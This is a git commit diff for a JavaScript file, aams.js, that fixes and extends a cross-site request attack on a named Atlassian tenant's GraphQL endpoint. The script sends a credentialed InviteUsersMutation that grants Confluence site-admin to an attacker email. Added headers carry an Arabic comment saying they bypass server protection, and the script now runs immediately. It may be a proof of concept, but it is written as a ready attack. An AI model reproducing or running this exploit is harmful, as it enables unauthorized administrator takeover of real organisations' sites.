c39ad8d79660c10ddd849b0f94f783952502ee7c
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2025-12-31 18:15:32 +0300

    Update aams.js

--- aams.js
+++ aams.js
@@ -1,23 +1,38 @@
 function loadDoc1() {
   var xhttp = new XMLHttpRequest();
-  xhttp.open("POST", "https://anshall.atlassian.net/cgraphql?q=InviteUsersMutation);
+  // تصحيح الرابط وإضافة علامة الاقتباس المفقودة
+  var url = "https://anshall.atlassian.net/cgraphql?q=InviteUsersMutation";
+
+  xhttp.open("POST", url, true);
+  
+  // إضافة الرؤوس الضرورية لتجاوز حماية السيرفر
   xhttp.setRequestHeader("Content-type", "application/json");
+  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
+  xhttp.setRequestHeader("X-Apollo-Operation-Name", "InviteUsersMutation");
+  
   xhttp.withCredentials = true;
+
   var data = JSON.stringify([{
     "operationName": "InviteUsersMutation",
     "variables": {
         "emails": ["attackerx@atomicmail.io"],
         "productRoles": [{
             "productId": "confluence",
-            "roleId": "site-admin" // هنا مكمن الخطورة
+            "roleId": "site-admin" 
         }]
     },
     "query": "mutation InviteUsersMutation($emails: [String!]!, $productRoles: [ProductRoleInput!]!) { inviteUsers(emails: $emails, productRoles: $productRoles) { success errors { message } } }"
-}]);
- xhttp.send(data);
- 
+  }]);
+
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      console.log("Status: " + this.status);
+      console.log("Response: " + this.responseText);
+    }
+  };
+
+  xhttp.send(data);
 }
 
-window.onload = loadDoc1;
-
-
+// استدعاء الدالة مباشرة للتجربة في الكونسول
+loadDoc1();
